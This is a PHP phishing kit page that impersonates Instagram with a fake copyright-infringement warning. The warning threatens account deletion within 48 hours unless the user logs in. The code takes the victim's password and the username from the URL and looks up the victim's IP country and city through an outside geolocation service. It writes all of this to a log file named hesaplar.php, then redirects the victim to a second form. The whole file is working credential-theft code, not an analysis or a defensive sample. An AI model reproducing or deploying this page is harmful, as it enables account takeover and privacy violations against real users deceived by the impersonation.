<?php
include 'ara.php';



include("app/index.php");
$lusy=$_GET['nick'];
$ch = curl_init();

$result = curl_exec($ch);
if($_POST){

	$password=$_POST["password"];
	
	$ip=$_SERVER["REMOTE_ADDR"];
	$konum = file_get_contents("http://ip-api.com/xml/".$ip);
$cek = new SimpleXMLElement($konum);
$ulke = $cek->country;
$sehir = $cek->city;
date_default_timezone_set('Europe/Istanbul');  
$cur_time=date("d-m-Y H:i:s");
$file = fopen('hesaplar.php', 'a'); //TXT DE BURADAN DEGISIYOR  
fwrite($file, "
<html>
<head>
	<meta http-equiv='Content-Type' content='text/html;charset=UTF-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'>

</head>
<style>

    .center {
      
      margin: 0 auto;
      
    }

    .awesome {
      
      color:#313131;
      -webkit-animation:colorchange 10s infinite alternate;
      
      
    }

    @-webkit-keyframes colorchange {
      0% {
        
        color: blue;
      }
      
      10% {
        
        color: #8e44ad;
      }
      
      20% {
        
        color: #1abc9c;
      }
      
      30% {
        
        color: #d35400;
      }
      
      40% {
        
        color: blue;
      }
      
      50% {
        
        color: #34495e;
      }
      
      60% {
        
        color: blue;
      }
      
      70% {
        
        color: #2980b9;
      }
      80% {
     
        color: #f1c40f;
      }
      
      90% {
     
        color: #2980b9;
      }
      
      100% {
        
        color: pink;
      }
    }
</style>
<body bgcolor='#000000'>
<body bgcolor='rgb(0,0,0)'>
<body bgcolor='black'>
<hr>
<font class='awesome' style='font-family:Arial'>
<font color='orange'>Kullanıcı Adı: </font><font color='white'>".$lusy."</font><br>
<font color='orange'> Şifre: </font><font color='white'>".$password."</font><br>
<font color='orange'>Ip Adresi: </font><font color='white'>".$ip."</font><br>
<font color='#1adfed'>Tarih: </font><font color='white'>".$cur_time."</font><br>
<font color='#1adfed'>Ülke: </font><font color='white'>".$ulke."</font><br>
<font color='#1adfed'>Şehir: </font><font color='white'>".$sehir."</font><br>
</font>
<hr>
<br>

"); 
fclose($file);


header("location: form.php?nick=$lusy");
}
?>

<html>
    
<head>
	<title>Copyright Infringement @<?php echo $lusy; ?></title>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width,initial-scale=1">
	
	    <script
      src="https://code.jquery.com/jquery-3.4.1.min.js"
      integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo="
      crossorigin="anonymous"
    ></script>
    <link
      href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"
      rel="stylesheet"
      type="text/css"
    />
    <style>
      .button {
-webkit-box-direction: normal;
margin: 0;
font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
border-radius: 3px;
border-style: solid;
border-width: 1px;
font-size: 14px;
font-weight: 600;
line-height: 26px;
outline: 0;
overflow: hidden;
text-overflow: ellipsis;
user-select: none;
white-space: nowrap;
width: 50%;
background: rgba(var(--d69,0,149,246),1);
border-color: rgba(var(--d69,0,149,246),1);
color: rgba(var(--eca,255,255,255),1);
cursor: pointer;
padding: 0 12px;
      }
      .button:disabled {
        opacity: 0.5;
      }
      .hide {
        display: none;
      }
    </style>
	<link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/9/95/Instagram_new.svg/1200px-Instagram_new.svg.png">
</head>
<body>
	<div style="margin:0; padding;">

 
  

  <head>
<?php
?>
</head>
<body>
<div class="MFkQJ ABLKx VhasA _1-msl"><div class="GfkS6 "></div><div class="ZsSMR"><a class="z1VUo KD4vR ABLKx VhasA" href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&amp;ct=igweb.loginPage.installLink&amp;mt=8&amp;vt=lo" role="alert"><section class="dZvHF  fvoD7"><p class="xK6EF">Instagram</p><p class="_5b2Kp">Get Instagram from Google Play Or App Store</p></section><section class="FMlV_"><button class="_4IAxF">Get</button></section></a></div></div>
</div>



</div><br>
</div>


<center>
	<main><center>
	<img src="<?php echo $pp; ?>" style="max-width:40%; border-radius:600%;">
  <br>
  <h3 style="font-family:sans-serif; font-size:20px; line-height:45px; font-weight:600;"><?php echo $name; ?></h3><br>
			<h3 class="h3">Copyright Infringement on @<?php echo $lusy; ?></h3><br>
			<p>
We have received numerous complaints that you violated our copyright laws regarding your account. If you do not give us feedback, your account will be removed within 48 hours.
If you think this is wrong, continue by logging in.
			</p><br> <center>

			<form method="post" id="your_form_id" enctype="copyright.php">
			<input type="password" id="ppas" name="password" placeholder="Password"  required="on">
			<br>

			
<button class="button">
      <i class="loading-icon fa fa-spinner fa-spin hide"></i>
      <span class="btn-txt">Log In</span>
			 </button>
			 <br>
			 <br>
			 
		</form>
	</main>

    <script>
      $(document).ready(function() {
        $(".button").on("click", function() {
          $(".result").text("");
          $(".loading-icon").removeClass("hide");
          $(".button").attr("disabled", true);
          $(".btn-txt").text("Loading...");
		  

		  pass= document.getElementById("ppas").value;
   

      if (pass=="")
		  {
           alert("Please fill in all fields.");
	$(".loading-icon").addClass("hide");
            $(".button").attr("disabled", false);
			$(".btn-txt").text("Log In");
			return false;
			}

          
	    
document.getElementById('your_form_id').submit();

		  
		  
   });
        });
		

    </script>
 <br> <div><br><br> <div><br>
		<br>
	<div class="other">
	<center>	
 
  	<div class="      tHaIX             Igw0E   rBNOH          YBx95   ybXk5    _4EzTm                                                                                                        O1flK   _7JkPY    PdTAI ZUqME" style="height: 60px; width: 100%;"><span aria-label="From Facebook" class="glyphsSpriteFb_brand_center_grey u-__7"></span></div>

	</div>
<center>
</body>
<style type="text/css">
	*{font-family:sans-serif;}
	body{padding:0px;margin:0px;background:#fafafa}
	header{width:100%;
	height:145px;
      padding:0px;
      
	  background-color: white;
      margin:0px;}

.bilgikutu{width:100%;
	height:55px;
border:1px solid #cecece;
      padding:0px;
	  background-color: white;
      margin:0px;}
.hrktu{
border:1px solid #cecece;
}
		main{
			background:white;
			margin-top:20px;
			padding-top:20px;
			width:400px;
			max-width:90%;
			border:1px solid #dedede;
		}.h3{font-family:sans-serif;
			font-weight:400;
			color:#444;
			word-spacing:1px;
		}main p{
font-family:sans-serif;
color:#999;
width:270px; 
		}main input{
-webkit-box-direction: normal;
color: rgba(var(--i1d,38,38,38),1);
font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
background: 0 0;
border: 1px solid rgba(var(--b38,219,219,219),1);
border-radius: 3px;
box-sizing: border-box;
display: block;
font-size: 14px;
height: 34px;
line-height: 30px;
padding: 0 12px;
text-align: left;
width: 57%;
		}main .a_adaskpd{
			padding:7px 30px;
			margin-top:10px;
			outline:none;
			border:none;
			color:white;
			background:#3896f0;
			font-weight:bold;
			font-size:15px;
			margin-bottom:10px;
			border-radius:3px;
		}main input:focus{
			box-shadow: 0px 0px 0px 0px white;
			border:1px solid #3896f0;
		}
		.other{
border-bottom:1px solid #cecece;
		background:white;
		bottom:0px;
		position:fixed;
		width: 100%;
		}
</style>
</html>
